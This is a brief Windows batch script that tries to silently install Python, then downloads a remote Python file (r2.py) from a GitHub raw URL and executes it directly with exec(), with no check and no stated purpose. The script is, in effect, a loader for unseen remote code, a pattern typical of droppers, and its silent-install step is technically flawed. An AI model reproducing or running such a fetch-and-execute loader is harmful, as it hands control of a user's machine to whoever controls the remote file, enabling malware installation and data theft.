@echo off
start /wait "" https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe /quiet InstallAllUsers=1 PrependPath=1

python -m ensurepip

python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/X4SHH/improved-train/main/r2.py').read())"
